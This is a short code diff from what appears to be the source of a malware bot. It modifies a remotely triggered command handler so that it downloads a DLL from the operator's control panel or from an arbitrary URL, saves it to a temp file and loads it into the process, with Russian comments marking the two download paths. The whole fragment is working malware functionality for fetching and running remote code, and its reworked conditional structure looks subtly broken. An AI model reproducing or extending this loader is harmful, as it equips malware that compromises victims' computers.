@@ -709,21 +709,24 @@ bool ExecuteLoadDLL(PTaskManager, PCHAR Command, PCHAR Args)
 
 bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 {
+	char fileName[MAX_PATH];
+	File::GetTempName( fileName, 0 );
+	char* url = m_strstr( Args, "://" );
+	BYTE* data = 0;
 	DWORD size = 0;
-	BYTE* data = Plugin::Download( Args, NULL, &size, false );
+	if( url == 0 ) //качаем из админки
+		data = Plugin::Download( Args, NULL, &size, false );
+	else //качаем по урлу
+		if( !DownloadInMem( Args, &data, &size ) )
+			data = 0;
 	bool res = false;
 	if( data )
-	{
-		char fileName[MAX_PATH];
-		File::GetTempName( fileName, 0 );
 		if( File::WriteBufferA( fileName, data, size ) == size )
-		{
-			HMODULE dll = (HMODULE)pLoadLibraryA(fileName);
-			if( dll )
-			{
-				res = true;
-			}
-		}
+	if( data )
+	{
+		HMODULE dll = (HMODULE)pLoadLibraryA(fileName);
+		if( dll )
+			res = true;
 		MemFree(data);
 	}
 	return res;
